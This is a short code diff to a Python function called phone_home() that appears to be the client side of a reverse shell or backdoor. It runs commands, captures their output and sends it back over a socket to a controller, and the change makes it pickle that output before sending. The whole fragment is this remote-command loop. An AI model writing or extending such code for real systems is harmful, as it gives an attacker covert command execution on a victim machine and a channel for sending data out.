@@ -52,7 +52,9 @@ def phone_home():
                         FileNotFoundError
                     else:
                         cmd_return = (str(c) + "\n" + str(execute.stdout))
-                        s.sendall(bytes(cmd_return, "utf-8"))
+                        jar = pickle.dumps(cmd_return)
+                        s.sendall(jar)
+
             print("Told dad all about", cmd, "!")
     s.close
     s.shutdown
